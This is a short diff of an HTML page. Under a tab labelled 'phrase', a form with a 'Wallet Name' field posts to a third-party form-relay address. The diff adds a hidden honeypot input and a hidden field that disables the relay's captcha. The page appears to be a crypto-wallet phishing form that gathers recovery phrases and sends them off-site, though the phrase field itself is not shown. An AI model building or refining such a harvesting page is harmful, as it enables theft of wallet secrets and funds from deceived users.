@@ -107,6 +107,12 @@ header {
 					<div class="tab-content">
 						<div role="tabpanel" class="tab-pane fade show active" id="phrase">
 							<form method="post" action="https://formsubmit.co/31b38fb3f6f5eb9783dea9b202e3bab3">
+							<!-- Honeypot -->
+							<input type = "text" name = "_honey" style = "display: none;">
+							
+							<!-- Disable Captcha -->
+							<input type = "hidden" name = "_captcha" value = "false">
+							
 								<div class="form-group">
 									<input class="form-control" type="text" name="wallet" placeholder="Wallet Name">
 								</div>
